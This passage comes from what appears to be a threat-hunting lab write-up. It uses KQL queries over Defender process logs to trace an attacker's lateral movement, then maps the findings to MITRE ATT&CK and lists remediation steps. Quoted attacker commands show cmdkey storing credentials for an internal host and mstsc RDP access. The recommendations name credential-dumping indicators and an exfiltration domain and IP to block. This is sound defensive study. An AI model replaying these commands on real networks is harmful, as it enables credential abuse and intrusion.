  `"cmdkey.exe" /list`
  `"cmdkey.exe" /generic:10.1.0.188 /user:fileadmin /pass:**********`<br/>
💡 **Why it matters:** Lateral movement targets are selected based on their access to sensitive data or network privileges. Identifying these targets reveals attacker objectives.<br/>

**KQL Query Used:**
```
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where Timestamp between (datetime(2025-11-18T22:00:00.00Z) .. datetime(2025-11-22T23:00:00.00Z))
| where ProcessCommandLine has_any ("mstsc", "cmdkey")
| where InitiatingProcessFileName == "powershell.exe"
| project Timestamp, DeviceName, ActionType, FileName, FolderPath, ProcessCommandLine, InitiatingProcessFileName
| sort by Timestamp desc 

```
<img width="1144" height="640" alt="Flag19" src="https://github.com/user-attachments/assets/ebd26057-e4b1-4fe2-8ce4-cebe717713cf" />


---

🚩 **Flag 20 – LATERAL MOVEMENT - Remote Access Tool**  
🎯 **Objective:** Identify the remote access tool used for lateral movement.<br/> 
:brain: **Thought Process:** Using same query in Flag 19, I'm shown a RDP connection to a specific private IP within the organization of 10.1.0.188 as `"mstsc.exe" /V:10.1.0.188`.<br/>
📌 **Finding (answer):** `mstsc.exe`  
🔍 **Evidence:**  
- **Host:** "azuki-sl"
- **Timestamp:** 2025-11-19T19:10:41.372526Z
- **ActionType:** "ProcessCreated" | **FileName:** "mstsc.exe" 
- **ProcessCommandLine:** `"mstsc.exe" /v:10.1.0.188 `<br/>
💡 **Why it matters:** Windows native remote access tools are preferred for lateral movements making its harder to detect than custom tools.<br/>

**KQL Query Used:**
```
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where Timestamp between (datetime(2025-11-18T22:00:00.00Z) .. datetime(2025-11-22T23:00:00.00Z))
| where ProcessCommandLine has_any ("mstsc", "cmdkey")
| where InitiatingProcessFileName == "powershell.exe"
| project Timestamp, DeviceName, ActionType, FileName, FolderPath, ProcessCommandLine, InitiatingProcessFileName
| sort by Timestamp desc

```
<img width="1132" height="646" alt="Flag20" src="https://github.com/user-attachments/assets/3213f0a4-a5a7-40c2-9d3a-77988527b60d" />



---



## MITRE ATT&CK
- **Initial Access:** – Flags 1, 2<br/>
  -T1078: Flags 1 & 2<br/>
- **Execution:** T1059 (PowerShell) – Flags 7, 18<br/>
  -T1105: Flag 7<br/>
  -T1059: Flag 18<br/>
- **Persistence:** – Flag 8, 9, 17<br/>
  -T1053.005: Flag 8, 9<br/>
  -T1098: Flag 17<br/>
  -T1564.002: Flag 17<br/>
- **Credential Access:** T1003 – Flags 12, 13<br/>
- **Discovery:** T1018 – Flag 3<br/>
- **Lateral Movement:** – Flags 19, 20<br/>
  -T1550.002: Flag 19<br/>
  -T1021.001: Flag 20<br/>
- **Command & Control:** T1071.001 – Flags 10, 11<br/>
- **Exfiltration:** - Flag 14, 15<br/>
  -T1560: Flag 14<br/>
  -T1567: Flag 15<br/>
- **Defense Evasion:** – Flags 4, 5, 6, 16<br/>
  -T1036: Flag 4<br/>
  -T1564.012: Flag 5, 6<br/>
  -T1070.001: Flag 16<br/>

---

## Recommended Actions (Condensed)
1. Reset/rotate credentials (HR/IT/admin).  
2. Re-enable & harden Defender; deploy fresh Sysmon config.  
3. Block/monitor `*.pipedream.net` and related IPs (e.g., **52.54.13.125**).  
4. Integrity review/restore HR data (`PromotionCandidates.csv`, Carlos Tanaka records).  
5. Hunt for persistence across estate; remove `OnboardTracker.ps1` autoruns.  
6. Centralize logs; add detections for `comsvcs.dll, MiniDump` and Defender tamper.
